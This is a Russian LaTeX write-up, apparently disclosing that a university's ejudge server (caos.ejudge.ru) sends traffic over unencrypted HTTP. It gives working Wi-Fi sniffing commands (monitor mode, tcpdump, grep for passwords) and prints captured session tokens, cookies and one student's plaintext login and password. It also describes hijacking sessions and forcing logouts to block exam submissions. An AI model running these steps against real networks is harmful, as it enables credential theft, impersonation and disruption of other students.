@@ -1,0 +1,156 @@
+\documentclass{article}
+\usepackage{cmap}
+\usepackage[T2A]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage[english, russian]{babel}
+\usepackage[a4paper, left=10mm, right=10mm, top=12mm, bottom=15mm]{geometry}
+\usepackage{mathtools,amssymb}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{verbatim}
+
+
+\lstdefinestyle{mystyle}{
+	backgroundcolor=\color{backcolour},   
+	commentstyle=\color{codegreen},
+	keywordstyle=\color{magenta},
+	numberstyle=\tiny\color{codegray},
+	stringstyle=\color{codepurple},
+	basicstyle=\footnotesize,
+	breakatwhitespace=false,         
+	breaklines=true,                 
+	captionpos=b,                    
+	keepspaces=true,                 
+	numbers=left,                    
+	numbersep=5pt,                  
+	showspaces=false,                
+	showstringspaces=false,
+	showtabs=false,                  
+	tabsize=2
+}
+
+
+\begin{document}
+	\fontsize{10}{10}\selectfont
+	
+Поскольку caos.ejudge.ru работает по HTTP без SSL-шифрования, а в корпусе ФКН большинство студентов пользуются публичным Wi-Fi, переключив сетевую карту в режим мониторигна:
+\begin{verbatim}
+# service network-manager stop
+# ifconfig wlp3s0 down && iwconfig wlp3s0 mode monitor && ifconfig wlp3s0 up
+\end{verbatim}
+и запустив tcpdump:
+\begin{verbatim}
+# tcpdump -i wlp3s0 -l -s0 -w rawdump tcp dst port 80 and host 89.108.125.173
+\end{verbatim}
+можно легко перехватить логины, пароли, токены и cookie студентов, заходящих в тестирующую систему через Wi-Fi в учебном корпусе. 
+
+После частичного удаления бинарного мусора из дампа получается текстовый файл, содержащий перехваченные HTTP-запросы (см. пример в файле):
+\begin{verbatim}
+$ cat rawdump | strings > dump
+$ cat dump
+\end{verbatim}
+\fontsize{8}{8}\selectfont
+\begin{verbatim}
+<99@
+49:@
+|oNX
+"GET /ej/client?SID=3acc31c1501fa7dc&action=175&x=0 HTTP/1.1
+Host: caos.ejudge.ru
+Connection: keep-alive
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
+Referer: http://caos.ejudge.ru/ej/client/view-problem-submit/S3acc31c1501fa7dc?prob_id=97
+Accept-Encoding: gzip, deflate
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: EJSID=c744fedbf668334e
+jYl}
+jYl}
+jYl}
+GET /ej/client/view-report/Sf860b160e8bad62a?run_id=2256 HTTP/1.1
+Host: caos.ejudge.ru
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z010DD Build/MMB29P)
+Upgrade-Insecure-Requests: 1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://caos.ejudge.ru/ej/client/view-problem-submit/Sf860b160e8bad62a?prob_id=80
+Accept-Encoding: gzip, deflate
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: EJSID=b12600be634a9506
+jYl}
+jYl}
+49:@
+49:@
+-POST /ej/client HTTP/1.1
+Host: caos.ejudge.ru
+Connection: keep-alive
+Content-Length: 96
+Cache-Control: max-age=0
+Origin: http://caos.ejudge.ru
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://caos.ejudge.ru/ej/client?contest_id=60
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,ru;q=0.7
+Cookie: EJSID=3868c18e5a196e24
+contest_id=60&role=0&prob_name=&login=bpmi16513&password=qwerty123&locale_id=0&action_2=Log+in
+49<@
+Z9=@
+pGET /ej/client/main-page/S0fc64d8a4b5435b6?lt=1 HTTP/1.1
+Host: caos.ejudge.ru
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://caos.ejudge.ru/ej/client?contest_id=60
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,ru;q=0.7
+Cookie: EJSID=3868c18e5a196e24
+Z9=@
+@9B@
+oRlZ*
+49C@
+49D@
+\end{verbatim}
+\fontsize{10}{10}\selectfont
+Если в этот дамп попали пароли, то они находятся простым grep'ом:
+\begin{verbatim}
+$ cat dump | grep password
+contest_id=60&role=0&prob_name=&login=bpmi16513&password=qwerty123&locale_id=0&action_2=Log+in
+\end{verbatim}
+\newpage
+
+
+Вероятность попадания именно логинов и паролей в дамп не очень большая (если, конечно, это не начало контрольной работы, когда все логинятся одновременно; во время же лекций и семинаров мне удалось получить только два пароля), но также из дампа легко получить токены (действительны в течение суток) и cookie, которых вполне достаточно, чтобы отправлять запросы к caos.ejudge.ru от имени пользователя. В частности, можно получить список всех посылок пользователя и скачать эти посылки (кроме посылок на контрольной работе, там просмотр кода недоступен), сдать от имени пользователя решение (или несколько тысяч решений), запросить http://caos.ejudge.ru/ej/client/logout, после чего пользователю придётся перелогиниться, и его логин и пароль окажутся в следующем дампе. Также постоянная отправка запросов на http://caos.ejudge.ru/ej/client/logout с перехваченными токенами и cookie во время контрольной работы сделает невозможной отправку решений.
+
+
+В файле parse\_download\_logout.py приведён пример скрипта, который парсит дамп, извлекая оттуда токены и cookie, для каждого пользователя скачивает все его решения и разлогинивается.
+
+
+Поскольку в ejudge есть строка состояния, которая обновляется каждую минуту и отправляет запрос с токеном и cookie:
+
+\fontsize{8}{8}\selectfont
+\begin{verbatim}
+GET /ej/client?SID=3acc31c1501fa7dc&action=175&x=0 HTTP/1.1
+Host: caos.ejudge.ru
+Connection: keep-alive
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
+Referer: http://caos.ejudge.ru/ej/client/view-problem-submit/S3acc31c1501fa7dc?prob_id=97
+Accept-Encoding: gzip, deflate
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: EJSID=c744fedbf668334e
+\end{verbatim}
+\fontsize{10}{10}\selectfont
+для перехвата токена и cookie даже не нужно ждать когда пользователь обновит страницу или откроет новую: достаточно запустить tcpdump всего на одну минуту, и в дампе окажутся токены всех, кто пользуется (у кого открыта вкладка в браузере) тестирующей системой через публичный Wi-Fi в аудитории.
+
+
+Воспользоваться описанным выше крайне легко (это может сделать любой студент ФКН).
+
+
+\end{document}
